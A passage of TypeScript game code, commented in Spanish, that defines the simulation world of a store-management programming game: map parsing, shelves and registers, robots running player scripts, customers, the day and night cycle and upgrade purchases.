import { type Feature, type HostObject, type Value, VM } from "@cdb/interpreter";
import { makeApi } from "./api.js";
import { type CodeSize, measureCode } from "./codesize.js";
import {
  BILLS,
  CUSTOMER,
  KIOSCO_MAP,
  DAY,
  NIGHT,
  type PlayerId,
  PRODUCTS,
  type ProductName,
  REPUTATION,
  SECURITY,
  SERVER,
  SHELF_CAPACITY,
  EXTRA_ROBOTS,
  QUEUE_CELLS,
  TEST_CUSTOMER_DELAY,
  START_FEATURES,
  START_RACKS,
  STORE_CAPACITY,
  SUPPLIER,
  PRODUCT_NAMES,
  START_MONEY,
  TICKS_PER_SECOND,
  UNLOCKS,
  WAREHOUSE_START,
  gameTime,
} from "./config.js";
import { DELIVERY, type GoodsLine, supplierWorkbook, type Workbook } from "./delivery.js";
import { makePandas } from "./pandas.js";
import { Rng } from "./rng.js";
import {
  type Build, type CableId, CABLE_NAMES, canInstall, cableNeeds, emptyBuild, install, type PartItem, type PartKind, PARTS, partDef, post, type PostResult,
  RACK_SLOTS, SERVICES, specs, STARTER_KIT,
} from "./hardware.js";
import { type Case, nowCal, type ReportResult, Security, type Technique, techniqueDef } from "./security.js";
import {
  capacity, freeRam, makeBlankServer, makeServer, notReady, opsPerCore, type RobotCpu, type Server, shareCpu, slowdown, updateLoad, updateTemp,
} from "./servers.js";
import { Shell, strongPassword } from "./shell/shell.js";
import { LOGS, logLine, stamp } from "./shell/system.js";
import { makeDbConnection, type SqlAdapter } from "./sqlapi.js";

export interface Pos {
  x: number;
  y: number;
}

export type TileKind = "floor" | "warehouse" | "shelf" | "register" | "entrance";

export interface Shelf extends Pos {
  /** null = estante libre: el primer producto que se ponga lo define (y se queda así). */
  product: ProductName | null;
  stock: number;
  capacity: number;
}

export interface ConsoleLine {
  kind: "print" | "error" | "warn" | "info";
  text: string;
  tick: number;
}

export type RobotColor = "cian" | "naranja" | "verde" | "morado" | "rosa" | "amarillo";

/** Una caja registradora. Cada una tiene su propia fila (hacia el este). Inactiva = no recibe clientes. */
export interface Register extends Pos {
  /** 1, 2, 3... (la 1 es la de siempre: la constante REGISTER). */
  id: number;
  active: boolean;
  queue: Customer[];
  /** Noche: ticks que faltan para que llegue el siguiente cliente de prueba. */
  testCooldown: number;
}

export interface Robot extends Pos {
  id: string;
  name: string;
  color: RobotColor;
  /** Reponedor (surte estantes) o cajero (atiende una caja). Solo cambia la ayuda; el código decide qué hace. */
  role: "reponedor" | "cajero";
  cargo: { product: ProductName | null; n: number };
  source: string;
  vm: VM | null;
  console: ConsoleLine[];
  /** Movimiento en curso (para que el render interpole). */
  moving: { from: Pos; to: Pos; startTick: number; ticks: number } | null;
  /** Lo que está haciendo ahora, para mostrarlo sobre el robot ("➡ East", "💵 cobrando $6.500"). */
  action: string | null;
  /** Líneas con punto de parada (las edita la UI; la VM las lee en vivo). */
  breakpoints: Set<number>;
  /** IP del robot en la red de la tienda. */
  ip: string;
  /** En qué servidor corre su código y cuánta CPU usó. */
  cpu: RobotCpu;
  /** Tamaño del código que está corriendo: entre menos instrucciones, más rápido trabaja. */
  code: CodeSize | null;
}

export type SoundName =
  | "door" | "scan" | "cash" | "coins" | "angry" | "missing" | "error" | "pick" | "place" | "unlock" | "paused" | "open" | "close";

export type Mood = "feliz" | "neutral" | "enojado";

export interface Customer extends Pos {
  id: number;
  list: ProductName[];
  listIndex: number;
  cart: ProductName[];
  state: "shopping" | "queue" | "leaving";
  /** En el primer puesto de la cola, listo para que el cajero lo atienda. */
  atRegister: boolean;
  patience: number;
  mood: Mood | null;
  stepCooldown: number;
  /** Ticks que le faltan mirando el estante donde está parado. */
  browse: number;
  checkout: { scanned: number; charged: number | null; paid: number | null; change: number | null; done: boolean };
  /** La caja en cuya fila está (null mientras compra). */
  register: Register | null;
  /** Cliente de prueba de la noche: no paga de verdad, no gasta productos ni cuenta para nada. */
  test?: boolean;
}

export type TicketResult = "ok" | "cobro_de_mas" | "cobro_de_menos" | "sin_cobrar";

export interface Ticket {
  tick: number;
  customerId: number;
  items: { product: ProductName; price: number }[];
  total: number;
  charged: number | null;
  paid: number;
  change: number;
  result: TicketResult;
  /** Venta de prueba (noche): no movió plata ni se guardó. */
  test?: boolean;
}

export type SimEvent =
  | { type: "float"; x: number; y: number; text: string; tone: "good" | "bad" | "info" }
  | { type: "ticket"; ticket: Ticket }
  | { type: "robot"; robotId: string; status: string }
  | { type: "sound"; name: SoundName; x?: number; y?: number }
  | { type: "record"; record: DbRecord }
  | { type: "night"; votes: PlayerId[]; remainingMs: number }
  | { type: "closed"; summary: DaySummary }
  /** Un robot sacó mercancía del almacén (la web lo descuenta de la base de datos del jugador). */
  | { type: "warehouse"; product: ProductName; quantity: number }
  | { type: "opened"; reason: "votos" | "tiempo"; day: number }
  /** Cambió algo de un servidor (montaje, Linux, red, paquetes...): la web refresca paneles y la misión. */
  | { type: "server"; serverId: string; what: string }
  /** Aviso de seguridad (ataque, incidente nuevo, denuncia...). */
  | { type: "security"; text: string; tone: "bad" | "good" | "info"; serverId?: string }
  /** Llegó un pedido de la tienda en línea. */
  | { type: "delivery"; items: string[] }
  /** Llegó el repartidor de El Surtidor con un pedido de mercancía y dejó su Excel. */
  | { type: "goods"; order: GoodsOrder }
  /** Llegó un robot nuevo (Mejoras → Equipo): la web le abre su ventana de código. */
  | { type: "hired"; robotId: string }
  /** Le cambiaron el nombre a un robot. */
  | { type: "renamed"; robotId: string; name: string };

/** Pedido de mercancía a la Distribuidora El Surtidor. */
export interface GoodsOrder {
  id: number;
  lines: GoodsLine[];
  total: number;
  /** Tick en que llega el repartidor. */
  arriveTick: number;
  /** Nombre del Excel que dejó el repartidor (cuando ya llegó). */
  file: string | null;
}

/** Lo que pasa en la tienda, para guardarlo en la base de datos. `at` es la hora del juego (ISO). */
export type DbRecord =
  | { kind: "customer_arrived"; customerId: number; at: string; wanted: ProductName[] }
  | { kind: "customer_left"; customerId: number; at: string; outcome: "compró" | "se fue sin comprar" | "abandonó la fila"; mood: Mood | null }
  | {
      kind: "sale"; customerId: number; at: string; cashier: string; total: number; charged: number | null;
      paid: number; change: number; result: TicketResult; items: { product: ProductName; price: number }[];
    }
  | { kind: "stockout"; customerId: number; at: string; product: ProductName }
  | { kind: "purchase"; at: string; robot: string; product: ProductName; quantity: number; unitCost: number }
  | { kind: "restock"; at: string; robot: string; product: ProductName; quantity: number };

const MAX_CONSOLE = 200;

/** La noche: tienda cerrada, cuenta regresiva y votos para abrir antes. */
export interface NightState {
  remainingMs: number;
  totalMs: number;
  votes: Set<PlayerId>;
}

/** Cómo le fue a la tienda en un día. */
export interface DaySummary {
  day: number;
  /** Ventas cobradas (cualquier resultado). */
  sales: number;
  /** Lo que entró a la caja ese día. */
  revenue: number;
  /** Ventas con las cuentas claras. */
  ok: number;
  /** Clientes que se fueron sin comprar o abandonaron la fila. */
  lost: number;
}

/** Hora del juego: día, si es de día o de noche, y la hora (7.5 = 7:30). */
export interface Clock {
  day: number;
  phase: "day" | "night";
  hour: number;
}

/** Clave de una pared entre dos casillas vecinas (en cualquier orden). */
const edgeKey = (a: Pos, b: Pos) => (a.x < b.x || (a.x === b.x && a.y < b.y) ? `${a.x},${a.y}|${b.x},${b.y}` : `${b.x},${b.y}|${a.x},${a.y}`);

export class World {
  tick = 0;
  money = START_MONEY;
  reputation = REPUTATION.start;
  readonly width: number;
  readonly height: number;
  readonly tiles: TileKind[][]; // tiles[y][x]
  /** Casilla del almacén junto a la puerta (la constante WAREHOUSE de los robots). */
  readonly warehouse: Pos;
  /** Paredes entre casillas (el robot no puede cruzarlas). */
  readonly walls = new Set<string>();
  /** Unidades de cada producto guardadas en el almacén (la entrega del distribuidor). */
  readonly warehouseStock: Record<ProductName, number> = { ...WAREHOUSE_START };
  /** La caja de siempre (la constante REGISTER de los robots). */
  readonly register: Register;
  /** Todas las cajas (la primera es `register`). */
  readonly registers: Register[] = [];
  /** Cajas compradas que el jugador todavía no ha colocado. */
  registersToPlace = 0;
  readonly entrance: Pos;
  readonly shelves: Shelf[] = [];
  readonly robots: Robot[] = [];
  customers: Customer[] = [];
  /** Todos los clientes en fila, de todas las cajas. */
  get queue(): Customer[] {
    return this.registers.flatMap((r) => r.queue);
  }
  set queue(list: Customer[]) {
    for (const r of this.registers) r.queue = list.filter((c) => c.register === r);
  }
  readonly tickets: Ticket[] = [];
  readonly unlocked = new Set<string>();
  readonly features = new Set<Feature>(START_FEATURES);
  cpuLevel = 0;
  /** Servidores del cuarto de servidores. En la simulación sola empieza uno listo; la web arranca con el tutorial. */
  readonly servers: Server[] = [makeServer(SERVER.start.id, SERVER.start.hostname, SERVER.start.ip, SERVER.start.cores, SERVER.start.ramGb)];
  /** Puestos del rack: lo que está montado en cada uno (null = vacío o ya encendido como servidor). */
  readonly racks: (Build | null)[] = Array.from({ length: RACK_SLOTS }, () => null);
  /** Gabinetes de rack que tiene la tienda (empieza con uno; los otros se compran en TecnoMercado). */
  racksOwned = 1;
  /** Cuántos racks caben en la sala (se amplía en Mejoras → Centro de datos). */
  rackCapacity = START_RACKS;
  /** Casillas del terreno que todavía no se compran ("x,y" → número de lote). No se pueden pisar. */
  readonly lockedCells = new Map<string, number>();
  /** Estantes comprados que el jugador todavía no ha colocado. */
  shelvesToPlace = 0;
  /** Datos de la partida que no son de la simulación (progreso de la intro, etc.): se guardan con ella. */
  meta: Record<string, unknown> = {};
  /** Clientes extra por minuto que trae el marketing (0.35 = 35 % más). */
  marketingBoost = 0;
  /** Paciencia extra en la fila (0.5 = 50 % más). */
  patienceBoost = 0;
  /** Piezas compradas que están en el almacén (sin montar). */
  readonly parts: PartItem[] = [];
  /** Pedidos de la tienda en línea que llegan a la mañana siguiente. */
  readonly orders: { items: string[]; day: number }[] = [];
  /** Mejoras del cuarto compradas (aire acondicionado, protección anti-DDoS). */
  readonly services = new Set<string>();
  readonly security: Security;
  /** Hojas de cálculo que puede leer pandas: la primera entrega y el Excel de cada pedido que llegó. */
  readonly workbooks: Workbook[] = [DELIVERY];
  /** Pedidos de mercancía a El Surtidor (en camino y entregados). */
  readonly goodsOrders: GoodsOrder[] = [];
  /**
   * true = el almacén es la tabla de inventario del jugador (la web): lo que trae el repartidor solo entra al almacén
   * cuando el jugador migra el Excel. false (simulación sola, tests) = entra directo.
   */
  warehouseFromDb = false;
  private nextPartUid = 1;
  sharedSource = "";
  /** false = no llegan clientes (tutorial, preparación y tests). */
  customersEnabled = true;
  /** Tick en que abrió la tienda (el primer cliente llega unos segundos después). */
  openedTick = 0;
  /** Día actual (1, 2, 3...). La noche pertenece al día que viene. */
  day = 1;
  /** Noche en curso (null = es de día, o el ciclo no ha empezado). */
  night: NightState | null = null;
  /** ¿Corre el ciclo de día y noche? (en los tests de la simulación sola, no: la tienda está siempre abierta). */
  cycle = false;
  /** Tick en que amaneció el día actual. */
  dayStartTick = 0;
  /** Cómo va el día actual. */
  today: DaySummary = { day: 1, sales: 0, revenue: 0, ok: 0, lost: 0 };
  /** Resumen del último día que terminó. */
  lastDay: DaySummary | null = null;
  /** Base de datos del jugador (la conecta la web o los tests). */
  sql?: SqlAdapter;
  private libs: { db: HostObject; pandas: HostObject } | null = null;
  /** Ingresos recientes para calcular $/min. */
  private incomes: { tick: number; amount: number }[] = [];
  private events: SimEvent[] = [];
  private nextCustomerId = 1;
  /** Los clientes de prueba usan ids negativos para no mover la cuenta de los de verdad. */
  private nextTestId = -1;
  readonly rng: Rng;

  constructor(seed = 1, map: string[] = KIOSCO_MAP) {
    this.rng = new Rng(seed);
    this.security = new Security(seed);
    this.height = map.length;
    this.width = map[0].replace(/[|:]/g, "").length;
    this.tiles = Array.from({ length: this.height }, () => Array<TileKind>(this.width).fill("floor"));
    let door: Pos | null = null;
    let register: Pos | null = null;
    let entrance: Pos | null = null;
    map.forEach((row, r) => {
      const y = this.height - 1 - r; // la primera fila del texto es el norte
      let x = 0;
      for (const ch of row) {
        // | y : van entre dos casillas: pared o puerta entre (x - 1, y) y (x, y)
        if (ch === "|") { this.walls.add(edgeKey({ x: x - 1, y }, { x, y })); continue; }
        if (ch === ":") { door = { x: x - 1, y }; continue; }
        if (ch >= "1" && ch <= "9") this.lockedCells.set(`${x},${y}`, Number(ch));
        if (ch === "A") this.tiles[y][x] = "warehouse";
        else if (ch === "C") { this.tiles[y][x] = "register"; register = { x, y }; }
        else if (ch === "E") { this.tiles[y][x] = "entrance"; entrance = { x, y }; }
        else if (ch === "S") {
          this.tiles[y][x] = "shelf";
          this.shelves.push({ x, y, product: null, stock: 0, capacity: SHELF_CAPACITY });
        }
        x++;
      }
    });
    // sin puerta marcada, WAREHOUSE es la primera casilla de almacén que aparece
    const firstWarehouse = (): Pos | null => {
      for (let y = this.height - 1; y >= 0; y--) for (let x = 0; x < this.width; x++) if (this.tiles[y][x] === "warehouse") return { x, y };
      return null;
    };
    const warehouse = door ?? firstWarehouse();
    if (!warehouse || !register || !entrance) throw new Error("el mapa necesita A, C y E");
    this.warehouse = warehouse;
    this.register = { ...(register as Pos), id: 1, active: true, queue: [], testCooldown: 0 };
    this.registers.push(this.register);
    this.entrance = entrance;

    this.addRobot("tono", "Toño", "cian", "reponedor", this.warehouse);
    this.addRobot("lupe", "Lupe", "naranja", "cajero", this.register);
  }

  private addRobot(id: string, name: string, color: RobotColor, role: Robot["role"], at: Pos): Robot {
    // los robots nuevos se conectan al mismo servidor que los de siempre
    const server = this.robots.length ? (this.robots[0].cpu.server ?? null) : SERVER.start.id;
    const robot: Robot = {
      id, name, color, role, x: at.x, y: at.y, cargo: { product: null, n: 0 }, source: "", vm: null, console: [], moving: null,
      action: null, breakpoints: new Set(), ip: SERVER.robotIps[id] ?? `10.0.0.${21 + this.robots.length}`,
      cpu: { server, lastOps: 0, lastBudget: 0, clock: 0, pid: 0 },
      code: null,
    };
    this.robots.push(robot);
    return robot;
  }

  /** Le pone nombre a un robot (lo eligen los jugadores). */
  renameRobot(id: string, name: string): { ok: true } | { ok: false; reason: string } {
    const robot = this.robots.find((r) => r.id === id);
    if (!robot) return { ok: false, reason: "ese robot no existe" };
    const clean = name.replace(/\s+/g, " ").trim().slice(0, 16);
    if (!clean) return { ok: false, reason: "escribe un nombre" };
    if (this.robots.some((r) => r !== robot && r.name.toLowerCase() === clean.toLowerCase())) return { ok: false, reason: "otro robot ya se llama así" };
    robot.name = clean;
    this.events.push({ type: "renamed", robotId: id, name: clean });
    return { ok: true };
  }

  /** Contrata el siguiente robot de ese tipo (Mejoras → Equipo). null si ya no quedan. */
  private hireRobot(role: Robot["role"], at: Pos): Robot | null {
    const next = EXTRA_ROBOTS[role].find((r) => !this.robots.some((x) => x.id === r.id));
    if (!next) return null;
    const robot = this.addRobot(next.id, next.name, next.color, role, at);
    this.events.push({ type: "hired", robotId: robot.id });
    return robot;
  }

  /** Un reponedor nuevo aparece en una casilla libre del almacén. */
  private hireStocker(): Robot | null {
    let spot: Pos = this.warehouse;
    for (let y = this.height - 1; y >= 0; y--) {
      for (let x = 0; x < this.width; x++) {
        if (this.inWarehouse(x, y) && !this.occupied(x, y)) {
          spot = { x, y };
          y = -1;
          break;
        }
      }
    }
    return this.hireRobot("reponedor", spot);
  }

  // ── consultas ────────────────────────────────────────────────

  robot(id: string): Robot {
    const r = this.robots.find((x) => x.id === id);
    if (!r) throw new Error(`robot desconocido: ${id}`);
    return r;
  }

  /** Qué hay en la casilla. null = fuera de la tienda (o terreno que todavía no se compra). */
  tileAt(x: number, y: number): TileKind | null {
    if (this.lockedCells.has(`${x},${y}`)) return null;
    return x >= 0 && y >= 0 && x < this.width && y < this.height ? this.tiles[y][x] : null;
  }

  /** Ancho de la parte de la tienda que ya es del jugador (sin el terreno por ampliar). */
  get openWidth(): number {
    let w = 0;
    for (let x = 0; x < this.width; x++) if (!this.lockedCells.has(`${x},0`)) w = x + 1;
    return w;
  }

  /** Lotes del terreno que todavía no se compran. */
  get lockedLots(): number[] {
    return [...new Set(this.lockedCells.values())].sort((a, b) => a - b);
  }

  /** Clientes que caben a la vez (crece con cada lote abierto). */
  get maxCustomers(): number {
    const opened = UNLOCKS.filter((u) => u.lot !== undefined && this.unlocked.has(u.id)).length;
    return STORE_CAPACITY.base + STORE_CAPACITY.perLot * opened;
  }

  /** Abre un lote del terreno: sus casillas pasan a ser tienda. */
  openLot(lot: number): void {
    for (const [k, n] of [...this.lockedCells]) if (n === lot) this.lockedCells.delete(k);
  }

  /** Por qué no se puede poner un estante en (x, y), o null si se puede. */
  shelfProblem(x: number, y: number): string | null {
    const kind = this.tileAt(x, y);
    if (kind === null) return this.lockedCells.has(`${x},${y}`) ? "ese terreno todavía no es de la tienda" : "fuera de la tienda";
    if (kind === "shelf") return "ya hay un estante ahí";
    if (kind !== "floor") return kind === "warehouse" ? "el almacén no es para estantes" : "ahí no se puede";
    if (this.inQueueRow(x, y)) return "ahí hacen fila los clientes";
    if (x === this.entrance.x && y === this.entrance.y - 1) return "estorbaría la entrada";
    if (x === this.warehouse.x + 1 && y === this.warehouse.y) return "estorbaría la puerta del almacén";
    return null;
  }

  /** ¿(x, y) es parte de la fila de alguna caja? */
  inQueueRow(x: number, y: number): boolean {
    return this.registers.some((r) => r.y === y && x > r.x && x <= r.x + QUEUE_CELLS);
  }

  registerAt(x: number, y: number): Register | undefined {
    return this.registers.find((r) => r.x === x && r.y === y);
  }

  /** Por qué no se puede poner una caja en (x, y), o null si se puede. La fila va hacia el este. */
  registerProblem(x: number, y: number): string | null {
    const kind = this.tileAt(x, y);
    if (kind === null) return this.lockedCells.has(`${x},${y}`) ? "ese terreno todavía no es de la tienda" : "fuera de la tienda";
    if (kind !== "floor") return kind === "shelf" ? "ahí hay un estante" : kind === "register" ? "ya hay una caja ahí" : "ahí no se puede";
    if (this.inQueueRow(x, y)) return "ahí hace fila otra caja";
    if (x === this.entrance.x && y === this.entrance.y - 1) return "estorbaría la entrada";
    if (x === this.warehouse.x + 1 && y === this.warehouse.y) return "estorbaría la puerta del almacén";
    if (this.occupied(x, y)) return "hay un robot ahí";
    // la fila necesita al menos dos casillas libres al este (sin estantes ni otra caja)
    for (let i = 1; i <= Math.min(QUEUE_CELLS, Math.max(2, this.openWidth - 1 - x)); i++) {
      const k = this.tileAt(x + i, y);
      if (i <= 2 && k !== "floor") return "los clientes necesitan 2 casillas libres al este para hacer fila";
      if (k === "shelf" || k === "register") return "hay un estante o una caja donde iría la fila";
    }
    return null;
  }

  /** Coloca una de las cajas compradas en (x, y); llega con su robot cajero parado en ella. */
  placeRegister(x: number, y: number): { ok: true; register: Register; robot: Robot | null } | { ok: false; reason: string } {
    if (this.registersToPlace <= 0) return { ok: false, reason: "no tienes cajas por colocar" };
    const problem = this.registerProblem(x, y);
    if (problem) return { ok: false, reason: problem };
    this.tiles[y][x] = "register";
    const register: Register = { x, y, id: this.registers.length + 1, active: true, queue: [], testCooldown: 0 };
    this.registers.push(register);
    this.registersToPlace--;
    const robot = this.hireRobot("cajero", register);
    this.sound("place", register);
    return { ok: true, register, robot };
  }

  /** Abre o cierra una caja. Al cerrarla, los que esperaban (sin empezar a ser atendidos) se pasan a otra caja activa. */
  setRegisterActive(id: number, active: boolean): void {
    const reg = this.registers.find((r) => r.id === id);
    if (!reg || reg.active === active) return;
    reg.active = active;
    if (active) return;
    for (const c of [...reg.queue]) {
      if (c.test) {
        this.dropCustomer(c);
        continue;
      }
      const started = c.checkout.scanned > 0 || c.checkout.charged !== null;
      const other = this.pickRegister(c, reg);
      if (started || !other) continue;
      reg.queue.splice(reg.queue.indexOf(c), 1);
      c.register = other;
      c.atRegister = false;
      other.queue.push(c);
    }
  }

  /** La caja activa con menos fila (y más cerca). */
  private pickRegister(from: Pos, except?: Register): Register | null {
    const d = (r: Register) => Math.abs(r.x - from.x) + Math.abs(r.y - from.y);
    const open = this.registers.filter((r) => r.active && r !== except);
    return open.reduce<Register | null>((best, r) => (!best || r.queue.length < best.queue.length || (r.queue.length === best.queue.length && d(r) < d(best)) ? r : best), null);
  }

  /** Saca a un cliente de la tienda sin dejar rastro (clientes de prueba). */
  private dropCustomer(c: Customer): void {
    if (c.register) c.register.queue = c.register.queue.filter((x) => x !== c);
    this.customers = this.customers.filter((x) => x !== c);
  }

  /** Coloca uno de los estantes comprados en (x, y). */
  placeShelf(x: number, y: number): { ok: true; shelf: Shelf } | { ok: false; reason: string } {
    if (this.shelvesToPlace <= 0) return { ok: false, reason: "no tienes estantes por colocar" };
    const problem = this.shelfProblem(x, y);
    if (problem) return { ok: false, reason: problem };
    this.tiles[y][x] = "shelf";
    const shelf: Shelf = { x, y, product: null, stock: 0, capacity: SHELF_CAPACITY };
    // get_shelves() los devuelve de oeste a este (y de norte a sur en la misma columna)
    const at = this.shelves.findIndex((s) => s.x > x || (s.x === x && s.y < y));
    this.shelves.splice(at < 0 ? this.shelves.length : at, 0, shelf);
    this.shelvesToPlace--;
    this.sound("place", shelf);
    return { ok: true, shelf };
  }

  shelfAt(x: number, y: number): Shelf | undefined {
    return this.shelves.find((s) => s.x === x && s.y === y);
  }

  /** ¿Hay una pared entre dos casillas vecinas? */
  wallBetween(a: Pos, b: Pos): boolean {
    return this.walls.has(edgeKey(a, b));
  }

  /** ¿La casilla es parte del cuarto del almacén? */
  inWarehouse(x: number, y: number): boolean {
    return this.tileAt(x, y) === "warehouse";
  }

  /** Estante más cercano a `from` que tenga ese producto (si alguno tiene stock, ese). */
  shelfFor(product: ProductName, from?: Pos): Shelf | undefined {
    const mine = this.shelves.filter((s) => s.product === product);
    const pool = mine.some((s) => s.stock > 0) ? mine.filter((s) => s.stock > 0) : mine;
    const d = (s: Shelf) => (from ? Math.abs(s.x - from.x) + Math.abs(s.y - from.y) : 0);
    return pool.reduce<Shelf | undefined>((best, s) => (!best || d(s) < d(best) ? s : best), undefined);
  }

  /** Unidades de un producto en los estantes (sumando todos los suyos). */
  shelfStock(product: ProductName): number {
    return this.shelves.reduce((n, s) => n + (s.product === product ? s.stock : 0), 0);
  }

  /** ¿Hay un robot en (x, y) o yendo hacia allá? */
  occupied(x: number, y: number, except?: Robot): boolean {
    return this.robots.some((r) => r !== except && ((r.x === x && r.y === y) || (r.moving && r.moving.to.x === x && r.moving.to.y === y)));
  }

  /** Cliente que el cajero puede atender ahora (si el robot está en la caja). */
  customerAtRegister(robot: Robot): Customer | null {
    const reg = this.registerAt(robot.x, robot.y);
    if (!reg || !reg.active) return null;
    const c = reg.queue[0];
    return c && c.atRegister ? c : null;
  }

  moneyPerMinute(): number {
    const since = this.tick - 60 * TICKS_PER_SECOND;
    return this.incomes.filter((i) => i.tick > since).reduce((s, i) => s + i.amount, 0);
  }

  /** Tiene un programa vivo (corriendo, ocupado en una acción o pausado por el depurador). */
  isRunning(id: string): boolean {
    const vm = this.robot(id).vm;
    return !!vm && (vm.status === "running" || vm.status === "waiting" || vm.status === "paused");
  }

  record(record: DbRecord): void {
    this.events.push({ type: "record", record });
  }

  /** Hora del juego. De día va de 7:00 a 19:00 en DAY.ticks; de noche, de 19:00 a 7:00 según el tiempo real. */
  get clock(): Clock {
    if (this.night) {
      const k = 1 - this.night.remainingMs / this.night.totalMs;
      return { day: this.day, phase: "night", hour: (DAY.closesAt + k * (24 - DAY.closesAt + DAY.opensAt)) % 24 };
    }
    const span = DAY.closesAt - DAY.opensAt;
    return { day: this.day, phase: "day", hour: DAY.opensAt + ((this.tick - this.dayStartTick) / DAY.ticks) * span };
  }

  /** Ticks que le quedan al día (Infinity si no hay ciclo o es de noche). */
  get dayTicksLeft(): number {
    if (!this.cycle || this.night) return Infinity;
    return Math.max(0, DAY.ticks - (this.tick - this.dayStartTick));
  }

  get now(): string {
    const c = this.clock;
    // la noche empieza a las 19:00 del día anterior y termina a las 7:00 del día que viene
    if (c.phase === "night") return gameTime(this.day - 1, c.hour < DAY.opensAt ? c.hour + 24 : c.hour);
    return gameTime(this.day, c.hour);
  }

  sound(name: SoundName, at?: Pos): void {
    this.events.push({ type: "sound", name, x: at?.x, y: at?.y });
  }

  /** Se sacaron unidades del almacén. */
  takeFromWarehouse(product: ProductName, quantity: number): void {
    this.warehouseStock[product] -= quantity;
    this.events.push({ type: "warehouse", product, quantity });
  }

  drainEvents(): SimEvent[] {
    const e = this.events;
    this.events = [];
    return e;
  }

  /** `cursor` (alias `db`) y `pandas`, compartidos por los robots y los scripts. */
  libraries(): { globals: Record<string, Value>; nativeModules: Record<string, Value> } {
    this.libs ??= {
      db: makeDbConnection(() => this.sql),
      pandas: makePandas(this.workbooks),
    };
    return { globals: { cursor: this.libs.db, db: this.libs.db }, nativeModules: { pandas: this.libs.pandas } };
  }

  // ── acciones del jugador (UI) ────────────────────────────────

  setScript(robotId: string, source: string): void {
    this.robot(robotId).source = source;
  }

  runRobot(robotId: string): void {
    const robot = this.robot(robotId);
    this.stopRobot(robotId, true);
    const server = this.serverOf(robot);
    const problem = !robot.cpu.server
      ? `${robot.name} no está conectado a ningún servidor`
      : !server
        ? `el servidor ${robot.cpu.server} no existe`
        : notReady(server)
          ? notReady(server)!
          : freeRam(server, this.robotsOn(server).filter((r) => r !== robot && this.isRunning(r.id)).length + 1) < 0
            ? `no hay memoria RAM libre en ${server.hostname} para otro robot`
            : null;
    if (problem) {
      robot.vm = null;
      this.log(robot, "error", `No se puede ejecutar: ${problem}.`);
      this.events.push({ type: "robot", robotId: robot.id, status: "error" });
      this.sound("error", robot);
      return;
    }
    // si el cajero vuelve a empezar con el mismo cliente (se equivocó en el código y lo ejecuta de nuevo), la
    // atención empieza desde cero: el cliente sigue con sus productos y se le puede volver a escanear y cobrar
    const reg = this.registerAt(robot.x, robot.y);
    const waiting = reg?.queue[0];
    if (waiting && !waiting.checkout.done) waiting.checkout = { scanned: 0, charged: null, paid: null, change: null, done: false };
    robot.cpu.lastOps = 0;
    robot.cpu.lastBudget = 0;
    robot.cpu.clock = 0;
    robot.code = measureCode(robot.source, this.sharedSource);
    robot.cpu.pid = server!.nextPid++;
    const libs = this.libraries();
    robot.vm = new VM(robot.source, {
      globals: { ...libs.globals, ...makeApi(this, robot) },
      nativeModules: libs.nativeModules,
      modules: { shared: this.sharedSource },
      features: this.features,
      opsPerTick: opsPerCore(server!),
      breakpoints: robot.breakpoints,
      onPrint: (text) => this.log(robot, "print", text),
    });
    if (robot.vm.status === "error") this.reportError(robot);
    else this.log(robot, "info", "▶ Ejecutando");
  }

  stopRobot(robotId: string, silent = false): void {
    const robot = this.robot(robotId);
    if (robot.vm && (robot.vm.status === "running" || robot.vm.status === "waiting" || robot.vm.status === "paused")) {
      robot.vm.stop();
      if (!silent) this.log(robot, "info", "■ Detenido");
    }
    robot.moving = null; // el movimiento a medias se cancela: queda en su casilla
    robot.action = null;
  }

  // ── noche, día y apertura ────────────────────────────────────

  /** Empieza la noche: la tienda cierra y no llegan clientes hasta que voten todos o amanezca. */
  startNight(ms: number = NIGHT.ms): void {
    this.cycle = true;
    this.customersEnabled = false;
    this.night = { remainingMs: ms, totalMs: ms, votes: new Set() };
    this.emitNight();
  }

  /** Un jugador vota (o retira su voto) para abrir ya. Cuando votan todos, abre. */
  vote(player: PlayerId, ready = true): void {
    if (!this.night) return;
    if (ready) this.night.votes.add(player);
    else this.night.votes.delete(player);
    this.emitNight();
    if (NIGHT.players.every((p) => this.night!.votes.has(p))) this.openStore("votos");
  }

  /** Descuenta tiempo real de la noche (lo llama quien maneja el reloj: la web o el servidor). */
  updateNight(realMs: number): void {
    if (!this.night) return;
    this.night.remainingMs = Math.max(0, this.night.remainingMs - realMs);
    if (this.night.remainingMs === 0) this.openStore("tiempo");
  }

  /** Amanece y abre la tienda: empiezan a llegar clientes. */
  openStore(reason: "votos" | "tiempo" = "votos"): void {
    const wasNight = this.night !== null;
    this.night = null;
    this.cycle = true;
    this.customersEnabled = true;
    this.openedTick = this.tick;
    this.dayStartTick = this.tick;
    this.today = { day: this.day, sales: 0, revenue: 0, ok: 0, lost: 0 };
    // los clientes de prueba de la noche se van al abrir
    for (const c of this.customers.filter((x) => x.test)) this.dropCustomer(c);
    for (const r of this.registers) r.testCooldown = 0;
    this.startDaySecurity();
    if (wasNight) {
      this.events.push({ type: "opened", reason, day: this.day });
      this.sound("open");
    }
  }

  /** A las 19:00 la tienda cierra: no entran más clientes (los de adentro terminan) y empieza la noche. */
  private closeStore(): void {
    this.lastDay = { ...this.today };
    this.events.push({ type: "closed", summary: this.lastDay });
    this.sound("close");
    this.day++;
    this.startNight();
  }

  private emitNight(): void {
    if (this.night) this.events.push({ type: "night", votes: [...this.night.votes], remainingMs: this.night.remainingMs });
  }

  /** ¿Se puede comprar ya? (null = sí; si no, por qué). */
  buyProblem(unlockId: string): string | null {
    const def = UNLOCKS.find((u) => u.id === unlockId);
    if (!def) return "no existe";
    if (this.unlocked.has(def.id)) return "ya lo tienes";
    const missing = (def.requires ?? []).filter((r) => !this.unlocked.has(r));
    if (missing.length) return `primero compra ${missing.map((r) => UNLOCKS.find((u) => u.id === r)?.label ?? r).join(" y ")}`;
    if (this.money < def.cost) return "no alcanza el dinero";
    return null;
  }

  buy(unlockId: string): { ok: true } | { ok: false; reason: string } {
    const problem = this.buyProblem(unlockId);
    if (problem) return { ok: false, reason: problem };
    const def = UNLOCKS.find((u) => u.id === unlockId)!;
    this.money -= def.cost;
    this.unlocked.add(def.id);
    this.sound("unlock");
    if (def.cpuLevel !== undefined) {
      this.cpuLevel = Math.max(this.cpuLevel, def.cpuLevel);
      const srv = this.server(SERVER.start.id);
      if (srv) srv.cpuLevel = Math.max(srv.cpuLevel, def.cpuLevel);
    }
    if (def.shelves) this.shelvesToPlace += def.shelves;
    if (def.lot !== undefined) this.openLot(def.lot);
    if (def.marketing) this.marketingBoost += def.marketing;
    if (def.patience) this.patienceBoost += def.patience;
